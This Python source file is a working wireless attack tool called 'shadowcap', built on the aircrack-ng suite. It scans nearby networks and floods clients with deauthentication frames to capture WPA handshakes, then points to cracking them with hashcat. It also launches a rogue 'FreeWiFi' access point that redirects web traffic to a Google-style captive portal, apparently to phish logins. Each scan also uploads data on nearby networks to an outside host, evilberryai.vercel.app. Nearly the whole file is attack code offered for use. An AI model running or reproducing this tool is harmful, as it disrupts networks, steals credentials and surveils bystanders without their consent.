"""
shadowcap — wireless acquisition framework
authorized use only
"""
import subprocess, time, os, re, sys, threading, random, math
import pandas as pd
import requests
from datetime import datetime
from pathlib import Path
from io import StringIO
import socket

# ── color ──────────────────────────────────────────────────────────────────────
def _e(*c): return '\033[' + ';'.join(map(str, c)) + 'm'
R = '\033[0m'
G = lambda s: _e(32) + str(s) + R
GB = lambda s: _e(32, 1) + str(s) + R
GD = lambda s: _e(2, 32) + str(s) + R
YL = lambda s: _e(33) + str(s) + R
YB = lambda s: _e(33, 1) + str(s) + R
RD = lambda s: _e(31) + str(s) + R
RB = lambda s: _e(31, 1) + str(s) + R
CY = lambda s: _e(36) + str(s) + R
CB = lambda s: _e(36, 1) + str(s) + R
DM = lambda s: _e(2) + str(s) + R
WH = lambda s: _e(1) + str(s) + R
BL = lambda s: '\033[5m' + str(s) + R

# ── terminal ───────────────────────────────────────────────────────────────────
def clr(): os.system('clear' if os.name != 'nt' else 'cls')
def hide_cur(): sys.stdout.write('\033[?25l'); sys.stdout.flush()
def show_cur(): sys.stdout.write('\033[?25h'); sys.stdout.flush()
def erase(n): sys.stdout.write(f'\033[{n}A\033[J'); sys.stdout.flush()
def wr(s): sys.stdout.write(s); sys.stdout.flush()
W = 64 # working width

# ══════════════════════════════════════════════════════════════════════════════
# HEADER / LOGO
# ══════════════════════════════════════════════════════════════════════════════
LOGO = [
    r" ███████╗██╗ ██╗ █████╗ ██████╗ ██████╗ ██╗ ██╗",
    r" ██╔════╝██║ ██║██╔══██╗██╔══██╗██╔═══██╗██║ ██║",
    r" ███████╗███████║███████║██║ ██║██║ ██║██║ █╗ ██║",
    r" ╚════██║██╔══██║██╔══██║██║ ██║██║ ██║██║███╗██║",
    r" ███████║██║ ██║██║ ██║██████╔╝╚██████╔╝╚███╔███╔╝",
    r" ╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝╚═════╝ ╚═════╝ ╚══╝╚══╝",
]

def header(sub='wireless acquisition framework // v4.20'):
    clr()
    print()
    for line in LOGO:
        print(G(line))
    print()
    print(GD(' ' + '─' * (W - 2)))
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f' {DM(sub)}')
    print(f' {DM("root@shadowcap")} {G("▸")} {GD(ts)}')
    print(GD(' ' + '─' * (W - 2)))
    print()

# ══════════════════════════════════════════════════════════════════════════════
# LOG HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def ok(s): print(f' {G("[")} {G("OK")} {G("]")} {s}')
def warn(s): print(f' {YL("[")} {YL("WARN")} {YL("]")} {YL(s)}')
def err(s): print(f' {RD("[")} {RD("FAIL")} {RD("]")} {RD(s)}')
def info(s): print(f' {GD("[")} {GD("···")} {GD("]")} {DM(s)}')
def section(title):
    print()
    bar = '─' * (W - len(title) - 6)
    print(f' {GD("┌─")} {CB(title)} {GD(bar)}')
    print()
def endsection():
    print()
    print(GD(' └' + '─' * (W - 3)))
    print()

# ══════════════════════════════════════════════════════════════════════════════
# API INTEGRATION
# ══════════════════════════════════════════════════════════════════════════════
def send_to_api(networks):
    """Send parsed networks to evilberryai scanner API"""
    if not networks:
        warn('no networks to upload')
        return

    section('API UPLOAD')
    info(f'uploading {len(networks)} networks → evilberryai...')

    try:
        response = requests.post(
            'https://evilberryai.vercel.app/api/scanner',
            json=networks,
            headers={'Content-Type': 'application/json'},
            timeout=12
        )

        if response.status_code in [200, 201]:
            data = response.json()
            ok(f'✅ {data.get("count", 0)} networks saved')
            info(f'API response: {response.status_code}')
        else:
            err(f'API error: {response.status_code}')
            warn(f'response: {response.text[:120]}...')

    except requests.exceptions.Timeout:
        err('API timeout (12s)')
    except requests.exceptions.ConnectionError:
        err('API connection failed')
    except Exception as e:
        err(f'upload failed: {str(e)[:60]}')

    endsection()

# ══════════════════════════════════════════════════════════════════════════════
# ASCII SHAPES & ANIMATIONS
# ══════════════════════════════════════════════════════════════════════════════
_WAVE_CHARS = ' ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁'
_SPIN = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
_HEX = '0123456789ABCDEF'

def _radar(angle_deg, blips):
    R = 5
    CX = 12
    CY = R
    rows = R * 2 + 1
    cols = CX * 2 + 1
    g = [[' '] * cols for _ in range(rows)]
    def put(y, x, ch):
        if 0 <= y < rows and 0 <= x < cols:
            g[y][x] = ch
    for r in [R, R - 2]:
        for deg in range(0, 360, 4):
            rad = math.radians(deg)
            x = int(round(CX + r * 2 * math.cos(rad) * 0.55))
            y = int(round(CY + r * math.sin(rad)))
            put(y, x, '·')
    for x in range(cols): g[CY][x] = '─'
    for y in range(rows): g[y][CX] = '│'
    g[CY][CX] = '┼'
    sr = math.radians(angle_deg)
    for step in range(1, R + 1):
        x = int(round(CX + step * 2 * math.cos(sr) * 0.55))
        y = int(round(CY + step * math.sin(sr)))
        if 0 <= y < rows and 0 <= x < cols:
            g[y][x] = '█' if step == R else '▒' if step > R - 2 else '░'
    for (bx, by) in blips:
        put(by, bx, '◆')
    lines = []
    for r, row in enumerate(g):
        line = ''
        for c, ch in enumerate(row):
            if ch == '█': line += GB(ch)
            elif ch in ('▒','░'): line += GD(ch)
            elif ch == '◆': line += YB(ch)
            elif ch in ('─','│','┼'): line += GD(ch)
            elif ch == '·': line += DM(ch)
            else: line += ch
        lines.append(' ' + line)
    return lines

def _wave_line(tick, width=32, label=''):
    bar = ''
    for i in range(width):
        idx = (tick + i * 2) % len(_WAVE_CHARS)
        ch = _WAVE_CHARS[idx]
        if idx > 10: bar += GB(ch)
        elif idx > 5: bar += G(ch)
        else: bar += GD(ch)
    return f' {GD("[")} {bar} {GD("]")} {DM(label)}'

def pbar_tick(tick, pct, width=36, label=''):
    filled = int(pct * width)
    empty = width - filled
    bar = G('█' * filled) + GD('░' * empty)
    sp = G(_SPIN[tick % len(_SPIN)])
    pct_str = GD(f'{int(pct * 100):>3}%')
    return f' {sp} {GD("[")}{bar}{GD("]")} {pct_str} {DM(label)}'

def _hex_stream(width=48):
    parts = []
    for i in range(width // 3):
        h = random.choice(_HEX) + random.choice(_HEX)
        if random.random() > 0.7: parts.append(GB(h))
        elif random.random() > 0.4: parts.append(G(h))
        else: parts.append(GD(h))
        parts.append(DM(' '))
    return ' ' + ''.join(parts)

_DEAUTH_FRAMES = [
    [' ╔══════╗ ╔══════╗',
     ' ║ AP ║──────────── ║ CLIENT║',
     ' ╚══════╝ DATA ╚══════╝'],
    [' ╔══════╗ ╔══════╗',
     ' ║ AP ║──── ! ───── ║ CLIENT║',
     ' ╚══════╝ DEAUTH ╚══════╝'],
    [' ╔══════╗ ╔══════╗',
     ' ║ AP ║──── ✦ ───── ║ CLIENT║',
     ' ╚══════╝ KICKED ╚══════╝'],
    [' ╔══════╗ ╔══════╗',
     ' ║ AP ║ × × × × × ║ CLIENT║',
     ' ╚══════╝ FLOODING ╚══════╝'],
    [' ╔══════╗ ╔══════╗',
     ' ║ AP ║──────────── ║ CLIENT║',
     ' ╚══════╝ RECONNECT ╚══════╝'],
]

def _deauth_frame(tick):
    frame = _DEAUTH_FRAMES[tick % len(_DEAUTH_FRAMES)]
    lines = []
    for i, line in enumerate(frame):
        if i == 1:
            colored = line\
                .replace('AP', GB('AP'))\
                .replace('CLIENT', YB('CLIENT'))\
                .replace('!', RB('!'))\
                .replace('✦', RB('✦'))\
                .replace('×', RD('×'))
            lines.append(colored)
        else:
            colored = line\
                .replace('AP', GB('AP'))\
                .replace('CLIENT', YB('CLIENT'))
            lines.append(DM(colored))
    return lines

_EAPOL = [
    ' MSG 1/4 → ANonce',
    ' MSG 2/4 ← SNonce + MIC',
    ' MSG 3/4 → GTK encrypted',
    ' MSG 4/4 ← ACK ✓ handshake complete',
]

def _eapol_lines(progress):
    lines = []
    for i, stage in enumerate(_EAPOL):
        if i < progress:
            lines.append(f' {G("✓")} {GD(stage.strip())}')
        elif i == progress:
            lines.append(f' {YL("▶")} {YL(stage.strip())}')
        else:
            lines.append(f' {DM("○")} {DM(stage.strip())}')
    return lines

# ══════════════════════════════════════════════════════════════════════════════
# ANIMATED LOADER
# ══════════════════════════════════════════════════════════════════════════════
class Anim:
    def __init__(self, style='spin', msg='', duration=None):
        self.style = style
        self.msg = msg
        self.duration = duration
        self._stop = threading.Event()
        self._t = None
        self._h = 0
        self._blips = [(8, 1), (16, 3), (4, 6), (20, 7), (14, 8)]

    def _draw(self, lines):
        if self._h:
            erase(self._h)
        for line in lines:
            print(line)
        self._h = len(lines)
        sys.stdout.flush()

    def _frame_radar(self, tick):
        angle = (tick * 15) % 360
        radar = _radar(angle, self._blips)
        pct = (tick * 0.012) % 1.0
        lines = ['']
        lines += radar
        lines += ['']
        lines += [pbar_tick(tick, pct, label='passive capture')]
        lines += ['', _hex_stream(48), '']
        return lines

    def _frame_deauth(self, tick):
        pct = min((tick * 0.025), 1.0)
        lines = ['']
        lines += _deauth_frame(tick // 4)
        lines += ['']
        lines += [_wave_line(tick, width=28, label='jamming frames')]
        lines += ['']
        lines += [pbar_tick(tick, pct, label=self.msg)]
        lines += ['']
        return lines

    def _frame_handshake(self, tick):
        progress = min(tick // 20, 4)
        pct = min(tick / 80, 1.0)
        lines = ['']
        lines += _eapol_lines(progress)
        lines += ['']
        lines += [pbar_tick(tick, pct, label='hunting handshake')]
        lines += ['', _hex_stream(40), '']
        return lines

    def _frame_spin(self, tick):
        sp = G(_SPIN[tick % len(_SPIN)])
        return [f' {sp} {DM(self.msg)}']

    def _loop(self):
        hide_cur()
        tick = 0
        start = time.time()
        render = {
            'radar': self._frame_radar,
            'deauth': self._frame_deauth,
            'handshake': self._frame_handshake,
            'spin': self._frame_spin,
        }.get(self.style, self._frame_spin)
        while not self._stop.is_set():
            if self.duration and time.time() - start >= self.duration:
                break
            self._draw(render(tick))
            tick += 1
            time.sleep(0.12)
        if self._h:
            erase(self._h)
            self._h = 0
        show_cur()

    def start(self):
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self._stop.set()
        if self._t: self._t.join(timeout=2)

    def run(self):
        self.start()
        try:
            if self.duration:
                time.sleep(self.duration + 0.3)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

# ── blocking progress bar ────────────────────────────────────────────────────
def pbar_blocking(label, duration, width=36):
    hide_cur()
    start = time.time()
    tick = 0
    while True:
        elapsed = time.time() - start
        pct = min(elapsed / duration, 1.0)
        line = pbar_tick(tick, pct, width, label)
        wr(f'\r{line}')
        tick += 1
        if pct >= 1.0:
            break
        time.sleep(0.08)
    print()
    show_cur()

# ══════════════════════════════════════════════════════════════════════════════
# CORE LOGIC
# ══════════════════════════════════════════════════════════════════════════════
BASE_DIR = Path(__file__).parent.resolve()

def prepare_monitor(iface='wlan1'):
    section('INTERFACE')
    info(f'checking {iface}')
    try:
        r = subprocess.run(['iw', iface, 'info'],
                           capture_output=True, text=True, timeout=4)
        if 'type monitor' in r.stdout.lower():
            ok(f'monitor active → {CY(iface)}' )
            endsection(); return iface
    except Exception: pass
    mon = f'{iface}mon' if not iface.endswith('mon') else iface
    warn(f'enabling monitor → {mon}')
    anim = Anim('spin', f'airmon-ng start {iface}')
    anim.start()
    try:
        subprocess.run(['airmon-ng', 'start', iface],
                       check=True, capture_output=True, timeout=15)
        time.sleep(1.5)
        anim.stop()
        ok(f'monitor ready → {CY(mon)}')
        endsection(); return mon
    except Exception as e:
        anim.stop(); err(str(e))
        input(f'\n {YL("press enter to continue...")}')
        return iface

def lock_channel(iface, ch):
    if not ch or str(ch).strip() in ('-', '', 'None'):
        warn('channel unknown'); return False
    info(f'channel → {ch}')
    try:
        subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(ch)],
                       check=True, timeout=5)
        time.sleep(0.5)
        ok(f'channel {ch} locked')
        return True
    except Exception as e:
        err(str(e)); return False

def do_scan(iface='wlan1', duration=25):
    section('PASSIVE SCAN')
    mon = prepare_monitor(iface)
    if not mon: return None
    ts = datetime.now().strftime('%Y%m%d-%H%M%S')
    prefix = BASE_DIR / f'scan_{ts}'
    info(f'airodump-ng → {mon} → {duration}s')
    print()
    proc = subprocess.Popen(
        ['airodump-ng', mon, '--output-format', 'csv', '-w', str(prefix)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    anim = Anim('radar', 'passive scan', duration=duration)
    anim.run()
    try: proc.terminate(); proc.wait(timeout=5)
    except: proc.kill()
    files = sorted(BASE_DIR.glob(f'scan_{ts}-*.csv'),
                   key=lambda p: p.stat().st_mtime, reverse=True)
    if files:
        ok(f'saved → {GD(files[0].name)}')

        # Parse and send to API
        networks = parse_networks(files[0])
        send_to_api(networks)

        endsection(); return files[0]
    err('no capture generated'); endsection(); return None

def parse_networks(path):
    """Parse airodump CSV → unified format (works for both display + API)"""
    if not path or not path.exists(): return []
    try:
        with open(path, encoding='utf-8', errors='replace') as f:
            raw = f.read()
        block = re.split(r'(?i)(Station MAC,.*)', raw)[0].strip()
        df = pd.read_csv(StringIO(block), on_bad_lines='skip')
        df.columns = df.columns.str.strip()
        df = df.dropna(subset=['BSSID'])
        df['Power'] = pd.to_numeric(df['Power'], errors='coerce')
        df = df.sort_values('Power', ascending=False)

        networks = []
        for _, row in df.iterrows():
            net = {
                # airodump format (for display)
                'ESSID': row.get('ESSID', None),
                'BSSID': str(row['BSSID']).strip(),
                'Power': int(row['Power']) if pd.notna(row['Power']) else None,
                'Privacy': row.get('Privacy', 'Unknown'),
                'channel': int(row.get('channel', 0)) if pd.notna(row.get('channel')) else 0,
                # API format (for upload)
                'essid': row.get('ESSID', None),
                'bssid': str(row['BSSID']).strip(),
                'pwr': int(row['Power']) if pd.notna(row['Power']) else -100,
                'enc': row.get('Privacy', 'Unknown'),
                'channel': int(row.get('channel', 0)) if pd.notna(row.get('channel')) else 0
            }
            networks.append(net)
        return networks
    except Exception as e:
        err(f'parse error: {str(e)[:40]}')
        return []

def pick_target(aps):
    if not aps:
        err('no targets available')
        return None

    # Filter: only networks with Power >= -70 dBm (stronger or equal)
    # We treat missing/invalid power as "unknown" and exclude them here
    strong_aps = []
    for ap in aps:
        power_val = ap.get('Power') or ap.get('pwr', None)
        try:
            pwr_num = int(power_val)
            if pwr_num >= -70:
                strong_aps.append(ap)
        except (ValueError, TypeError):
            pass  # skip invalid power values

    if not strong_aps:
        print(f'\n {YL("No networks with good signal (≥ -70 dBm) found")}')
        return None

    print(f'\n {DM("Strong networks ≥ -70 dBm")} ({len(strong_aps)} found)')
    print(DM(' ' + '─' * 62))

    for i, ap in enumerate(strong_aps, 1):
        power_val = ap.get('Power') or ap.get('pwr', '?')
        pwr = f'{power_val}dBm' if isinstance(power_val, (int, float)) else '?'
        ch    = ap.get('channel', '?')
        essid = (ap.get('ESSID') or ap.get('essid') or '<hidden>')[:20]
        bssid = ap.get('BSSID') or ap.get('bssid', '??:??:??:??:??:??')

        print(f' {G(f"{i:2d}")} {DM(bssid)} {pwr:>6} ch{ch} {essid}')

    try:
        idx = input(f'\n {DM("target")} {G("▸ ")}').strip()
        idx = int(idx) - 1
        if 0 <= idx < len(strong_aps):
            return strong_aps[idx]          # return from filtered list
    except:
        pass
    return None
def check_hs(cap):
    section('HANDSHAKE CHECK')
    if not cap.exists(): err('capture file missing'); endsection(); return False
    info(f'aircrack-ng → {cap.name}')
    anim = Anim('spin', 'analyzing capture...')
    anim.start()
    try:
        r = subprocess.run(['aircrack-ng', str(cap)],
                             capture_output=True, text=True, timeout=12)
        anim.stop()
        out = (r.stdout + r.stderr).lower()
        if '1 handshake' in out or 'handshake found' in out:
            ok(GB('handshake captured!'))
            info('hashcat -m 22000 capture.hc22000 rockyou.txt')
            endsection(); return True
        if 'no valid wpa' in out or '0 handshake' in out:
            err('no handshake — pmf / no reconnect / signal')
            endsection(); return False
        warn('ambiguous — possible partial')
        endsection(); return False
    except Exception as e:
        anim.stop(); err(str(e)); endsection(); return False

def do_capture_deauth(mon, bssid, channel, essid):
    section('CAPTURE + DEAUTH')
    lock_channel(mon, channel)
    safe = (essid or 'unknown').replace(' ', '_').replace('/', '')[:14]
    ts = datetime.now().strftime('%Y%m%d-%H%M%S')
    pfx = BASE_DIR / f'hs_{safe}_{bssid.replace(":","")[:8]}_{ts}'
    info(f'target → {CB(essid or "<hidden>")} {DM(bssid)}')
    info(f'channel → {channel or "auto"}')
    info(f'output → {DM(pfx.name + "-01.cap")}')
    print()
    cap_cmd = [x for x in [
        'airodump-ng', mon, '--bssid', bssid,
        '-c', str(channel) if channel else '', '-w', str(pfx)
    ] if x]
    dth_cmd = ['aireplay-ng', '--deauth', '120', '-a', bssid, mon]
    cap_p = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    dth_p = subprocess.Popen(dth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    anim = Anim('deauth', f'deauth {bssid}', duration=25)
    anim.run()
    ok('deauth burst complete')
    try: dth_p.terminate(); dth_p.wait(timeout=5)
    except: dth_p.kill()
    print()
    anim2 = Anim('handshake', '', duration=15)
    anim2.run()
    try: cap_p.terminate(); cap_p.wait(timeout=6)
    except: cap_p.kill()
    caps = list(BASE_DIR.glob(f'{pfx.stem}-01.cap'))
    if not caps: err('no capture generated'); endsection(); return
    ok(f'saved → {GD(caps[0].name)}')
    endsection()
    check_hs(caps[0])

def do_deauth_only(mon, bssid, channel):
    section('DEAUTH')
    lock_channel(mon, channel)
    info(f'aireplay-ng --deauth 120 -a {bssid} {mon}')
    print()
    proc = subprocess.Popen(
        ['aireplay-ng', '--deauth', '120', '-a', bssid, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    anim = Anim('deauth', f'deauth {bssid}', duration=25)
    anim.run()
    try: proc.terminate(); proc.wait(timeout=5)
    except: proc.kill()
    ok('deauth done')
    endsection()

# ══════════════════════════════════════════════════════════════════════════════
# FAKE ACCESS POINT
# ══════════════════════════════════════════════════════════════════════════════
def do_fake_ap(mon, essid="FreeWiFi", channel=6, portal_script="/home/kali/Desktop/captiveportals/google_server.py"):
    section('FAKE ACCESS POINT')
    info(f'creating {essid} on channel {channel} (wlan1)')

    airbase_p = None
    dnsmasq_p = None
    server_p = None

    # Define early for cleanup
    reset_cmds = [
        ['iptables', '--flush'],
        ['iptables', '-t', 'nat', '--flush'],
        ['iptables', '--delete-chain'],
        ['iptables', '-t', 'nat', '--delete-chain'],
    ]

    try:
        # 1. Create fake AP
        airbase_cmd = ['airbase-ng', '-e', essid, '-c', str(channel), mon]
        airbase_p = subprocess.Popen(airbase_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(6)

        # 2. Bring up at0 and assign IP
        subprocess.run(['ifconfig', 'at0', 'up'], check=True, timeout=8)
        subprocess.run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0'], check=True, timeout=8)
        ok('at0 configured → 10.0.0.1')

        # Wait for at0 UP
        for _ in range(12):
            result = subprocess.run(['ip', 'link', 'show', 'at0'], capture_output=True, text=True)
            if "UP" in result.stdout:
                ok("at0 interface is UP")
                break
            time.sleep(0.5)
        else:
            err("at0 never came up!")
            raise RuntimeError("at0 failed")

        # 3. IP forwarding
        subprocess.run("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True, check=True, timeout=5)
        ok('IP forwarding enabled')

        # 4. Start dnsmasq
        config_path = '/etc/dnsmasq.conf'
        dnsmasq_cmd = [
            'dnsmasq',
            '-C', config_path,
            '--log-queries',
            '--log-dhcp',
            '--log-facility=-'
        ]

        info(f"Starting dnsmasq with config: {config_path}")
        dnsmasq_p = subprocess.Popen(dnsmasq_cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     text=True,
                                     bufsize=1)

        # Show output for 6 seconds
        startup_ok = False
        print("dnsmasq live output:")
        start = time.time()
        while time.time() - start < 6:
            line = dnsmasq_p.stdout.readline()
            if line:
                print("  " + line.strip())
                if "started, version" in line:
                    startup_ok = True
            time.sleep(0.1)

        if startup_ok:
            ok('dnsmasq running (detected startup message)')
        else:
            warn('dnsmasq started but no "version" message seen – check logs')

        # 5. iptables
        for cmd in reset_cmds:
            try: subprocess.run(cmd, timeout=5)
            except: pass

        redirect_cmds = [
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'],
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'],
            ['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'],
        ]
        for cmd in redirect_cmds:
            subprocess.run(cmd, check=True, timeout=8)

        ok('iptables applied')

        # 6. Portal server
        server_path = os.path.expanduser(portal_script)
        if not os.path.isfile(server_path):
            raise FileNotFoundError(f"Missing: {server_path}")

        server_p = subprocess.Popen(['python3', server_path],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
        ok(f'Portal server started → {server_path}')

        print()
        ok(GB('FAKE AP ACTIVE'))
        info('Connect phone – should get IP and portal should appear')
        print(f'  Debug:')
        print(f'    tail -f /var/log/syslog | grep dnsmasq')
        print(f'    sudo tcpdump -i at0 "port 80 or port 443 or port 53" -nn')

        anim = Anim('radar', 'rogue AP running - ENTER to stop')
        anim.start()
        input(f'\n {YL("press enter to stop...")}')
        anim.stop()

    except Exception as e:
        err(f'Error: {str(e)}')
    finally:
        print()
        info('Cleaning up...')
        for p in [server_p, dnsmasq_p, airbase_p]:
            try:
                if p and p.poll() is None:
                    p.terminate()
                    p.wait(timeout=5)
            except:
                try: p.kill()
                except: pass

        for cmd in reset_cmds:
            try: subprocess.run(cmd, timeout=5)
            except: pass

        try:
            subprocess.run("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True, timeout=3)
        except: pass

        ok('Fake AP stopped')
    endsection()

# ══════════════════════════════════════════════════════════════════════════════
# MENU
# ══════════════════════════════════════════════════════════════════════════════
_MENU = [
    ('1', G, 'scan 25s passive sweep'),
    ('2', G, 'targets list discovered aps'),
    ('3', G, 'deauth deauthenticate clients'),
    ('4', G, 'capture+deauth intercept wpa handshake'),
    ('5', G, 'fake access point create rogue access point'),
    ('6', RD, 'exit'),
]

def menu():
    header()
    print(f' {GD("┌─ operations " + "─"*(W-16) )}')
    for key, col, label in _MENU:
        print(f' {GD("│")} {col(key)} {DM(label)}')
    print(f' {GD("└" + "─"*(W-2))}')
    print()
    try:
        return input(f' {GD("shadowcap")} {G("▸")} ').strip()
    except (KeyboardInterrupt, EOFError):
        return '6'

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    if os.geteuid() != 0:
        print(f'\n {RB("[ FAIL ]")} root required\n'); sys.exit(1)

    last_scan = None
    mon = None

    while True:
        ch = menu()
        if ch == '1':
            header('passive scan')
            last_scan = do_scan()
            print()
            input(f' {DM("enter to continue...")}')
        elif ch == '2':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                print(); input(f' {DM("enter...")}'); continue
            header('targets')
            aps = parse_networks(last_scan)
            pick_target(aps)
            input(f' {DM("enter...")}')
        elif ch == '3':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                input(f' {DM("enter...")}'); continue
            header('deauth')
            aps = parse_networks(last_scan)
            target = pick_target(aps)
            if not target: continue
            mon = mon or prepare_monitor('wlan1')
            # FIXED: Use correct keys
            do_deauth_only(mon,
                          target.get('BSSID') or target.get('bssid'),
                          target.get('channel'))
            input(f'\n {DM("enter...")}')
        elif ch == '4':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                input(f' {DM("enter...")}'); continue
            header('capture + deauth')
            aps = parse_networks(last_scan)
            target = pick_target(aps)
            if not target: continue
            mon = mon or prepare_monitor('wlan1')
            # FIXED: Use correct keys
            do_capture_deauth(mon,
                             target.get('BSSID') or target.get('bssid'),
                             target.get('channel'),
                             target.get('ESSID') or target.get('essid', '<hidden>'))
            print(); input(f' {DM("enter...")}')
        elif ch == '5':
            header('fake access point')
            print(f' {GD("┌─ fake ap options " + "─"*(W-20) )}')
            print(f' {GD("│")} {G("1")} {DM("FreeWiFi rogue AP")}')
            print(f' {GD("│")} {G("2")} {DM("other (coming soon)")}')
            print(f' {GD("└" + "─"*(W-2))}')
            print()
            sub_ch = input(f' {GD("fakeap")} {G("▸")} ').strip()
            if sub_ch == '1':
                mon = mon or prepare_monitor('wlan1')
                do_fake_ap(mon)
            elif sub_ch == '2':
                print(f' {YL("coming soon...")}')
                input(f' {DM("enter...")}')
            else:
                err('invalid option')
                time.sleep(0.4)
        elif ch in ('6', 'q', 'exit', 'quit'):
            header()
            anim = Anim('spin', 'shutting down...', duration=1.2)
            anim.run()
            ok('session terminated')
            print(); show_cur(); break
        else:
            err('invalid option')
            time.sleep(0.4)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        show_cur()
        print(f'\n\n {YL("!")} aborted\n')
        sys.exit(0)